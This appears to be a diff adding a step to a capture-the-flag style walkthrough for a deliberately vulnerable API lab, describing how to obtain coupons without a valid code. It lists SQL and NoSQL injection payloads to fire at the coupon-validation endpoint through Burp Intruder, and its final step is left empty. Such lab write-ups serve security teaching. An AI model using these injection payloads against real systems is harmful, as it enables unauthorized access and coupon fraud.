@@ -168,6 +168,43 @@ Bonus.
 
 ### Challenge 12 - Find a way to get free coupons without knowing the coupon code.
 
+1. In the "Enter Coupon Code" box, enter a few characters and click Validate.
+2. From the HTTP History tab, click this request: POST `/community/api/v2/coupon/validate-coupon`
+3. Send to Intruder and add brackets to the coupon code parameter including the quotes.
+4. Make a list of payloads using:
+'
+''
+;%00
+--
+-- -
+""
+;
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+OR 1=1
+$gt
+{"$gt":""}
+{"$gt":-1}
+$ne
+{"$ne":""}
+{"$ne":-1}
+$nin
+{"$nin":1}
+{"$nin":[1]}
+|| '1'=='1
+//
+||'a'\\'a
+'||'1'=='1';//
+'/{}:
+'"\;{}
+'"\/$[].>
+{"$where":  "sleep(1000)"}
+5. 
+
+
 ## SQL Injection
 
 ### Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database
